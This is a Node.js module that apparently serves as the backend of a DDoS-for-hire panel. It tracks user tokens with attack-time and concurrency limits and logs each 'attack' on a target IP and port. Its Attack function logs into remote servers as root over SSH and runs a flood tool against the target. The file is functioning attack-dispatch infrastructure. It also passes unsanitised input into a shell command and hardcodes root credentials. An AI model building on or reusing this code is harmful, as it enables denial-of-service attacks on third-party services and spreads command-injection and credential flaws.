const fs = require('fs');
const { Client } = require('ssh2');

let AuthTokens = [];

const logs_file = 'Db/logs.db';

function GenerateRandomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;

    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }

    return result;
}

function GetCurrentSeconds() {
    return Date.now() / 1000;
}

function addAuthToken(auth_token, username, password, hwid, ip, maxcons, maxtime) {
    const authToken = {
        auth_token: auth_token,
        username: username,
        password: password,
        hwid: hwid,
        ip: ip,
        maxcons: maxcons,
        maxtime: maxtime,
        cons: 0,
        time: GetCurrentSeconds()
    };

    AuthTokens.push(authToken);
}

function getAuthTokenIndex(username = null, auth_token = null) {
    return AuthTokens.findIndex(token => token.username === username || token.auth_token === auth_token);
}

function removeAuthToken(username = null, auth_token = null) {
    AuthTokens = AuthTokens.filter(token => token.username !== username && token.auth_token !== auth_token);
}

function getAuthToken(username = null, auth_token = null) {
    return AuthTokens.find(token => token.username === username || token.auth_token === auth_token);
}

function UpdateAuthToken(username = null, auth_token = null, maxcons = null, maxtime = null, cons = null, time = null) {
    const index = getAuthTokenIndex(username, auth_token);
    if (index !== -1) {
        if (maxcons !== null) AuthTokens[index].maxcons = maxcons;
        if (maxtime !== null) AuthTokens[index].maxtime = maxtime;
        if (cons !== null) AuthTokens[index].cons = cons;
        if (time !== null) AuthTokens[index].time = time;
        return true;
    }
    return false;
}

function IsAttacking(username = null, auth_token = null) {
    const authToken = getAuthToken(username, auth_token);
    if (!authToken) return false;

    const currentTime = GetCurrentSeconds();
    const timeSinceLastAttack = currentTime - authToken.time;

    if (authToken.cons > 0 && timeSinceLastAttack < authToken.maxtime) {
        return true;
    } else if (timeSinceLastAttack >= authToken.maxtime) {
        UpdateAuthToken(username, auth_token, null, null, 0, currentTime);
        return false;
    }

    return false;
}

function LogAttack(username, ip, port, time, method) {
    const date = new Date().toLocaleString();
    console.log(`[DATE: ${date}] User ${username} attacked ${ip}:${port} for ${time} seconds using method ${method}`);
    try {
        if (!fs.existsSync(logs_file)) {
            fs.writeFileSync(logs_file, '');
        }

        fs.appendFileSync(logs_file, `[DATE: ${date}], ${username}, ${ip}, ${port}, ${time}, ${method}\n`);
    } catch (e) {
        console.error('Error logging attack:', e);
    }
}

function Attack(auth_token, ip, port, time, method) {
    if (IsAttacking(null, auth_token)) {
        return false;
    }

    const authToken = getAuthToken(null, auth_token);
    if (!authToken) {
        return false;
    }

    if (time > authToken.maxtime) time = authToken.maxtime;
    
    UpdateAuthToken(null, auth_token, null, null, authToken.cons + 1, GetCurrentSeconds());

    LogAttack(authToken.username, ip, port, time, method);

    const servers = [
        {
            host: "0.0.0.0",
            port: 22,
            username: 'root',
            password: 'test'
        }
    ];

    servers.forEach(server => {
        const command = `./${method} ${ip} ${port} ${time}`;
        const conn = new Client();

        conn.on('ready', () => {
            conn.exec(command, (err, stream) => {
                if (err) {
                    console.error('Error executing command:', err.message);
                    conn.end();
                    return; // Exit the function early if there's an error
                } else if (!err) {
                    console.log(`ROOT-SERVER-ONLINE [${server.host}]: SENT ${command}`);
                }
                stream
                    .on('close', (code, signal) => {
                        console.log(`Command closed with code ${code}, signal ${signal}`);
                        conn.end();
                    })
                    .on('data', data => {
                        console.log(`STDOUT: ${data}`);
                    })
                    .stderr.on('data', data => {
                        console.log(`STDERR: ${data}`);
                    });
            });
            // Handle 'end' event when the connection is closed
            conn.on('end', () => {
                console.log('Connection ended');
            });
        }).on('error', (err) => {
            console.error(`ROOT-SERVER-OFFLINE [${server.host}]:`, err.message);
        }).connect(server);
    });
    return true;
}

module.exports = {
    GenerateRandomString,
    GetCurrentSeconds,
    addAuthToken,
    removeAuthToken,
    getAuthToken,
    UpdateAuthToken,
    IsAttacking,
    LogAttack,
    Attack
};
